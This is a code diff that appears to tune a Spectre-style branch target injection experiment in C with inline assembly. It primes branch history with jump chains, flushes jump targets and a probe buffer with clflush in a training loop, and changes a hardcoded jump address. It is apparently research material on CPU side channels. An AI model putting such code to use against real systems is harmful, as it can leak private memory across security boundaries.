@@ -36,6 +36,7 @@ void indirect(void) {
     // If you want these to all be taken, set rax=0x11
     // otherwise there will be 16 not-taken branches
     asm volatile (
+            /*
             "cmpb  $0x02, %%al\n"
             "je .+2\n"
             "je .+2\n"
@@ -69,6 +70,7 @@ void indirect(void) {
             "je .+2\n"
             "je .+2\n"
             "je .+2\n"
+            */
             "mov (%%rbx), %%rax\n"
             "jmpq *%%rax\n"
             "add $6, %%rax\n"
@@ -131,10 +133,10 @@ void indirect(void) {
             "jmpq *%%rax\n"
             "add $6, %%rax\n"
             "jmpq *%%rax\n"
-            "nop\n"
-            "nop\n" // No idea why nops instead of an extra add/jmpq improves ~5%
-            //"add $6, %%rax\n"
-            //"jmpq *%%rax\n"
+            //"nop\n"
+            //"nop\n" // No idea why nops instead of an extra add/jmpq improves ~5%
+            "add $6, %%rax\n"
+            "jmpq *%%rax\n"
             :: "a"(0x03), "b"(&jmp_ptr) : "rcx");
 
 
@@ -146,8 +148,10 @@ void indirect(void) {
 void train()
 {
     fn_ptr = target_fn;
-    jmp_ptr = 0x400a5d;
+    //jmp_ptr = 0x400a5d;
+    jmp_ptr = 0x400a1b;
     while (1) {
+        //_mm_clflush(&probe_buf[110*4096]);
         _mm_clflush(fn_ptr);
         _mm_clflush(&jmp_ptr);
         indirect();
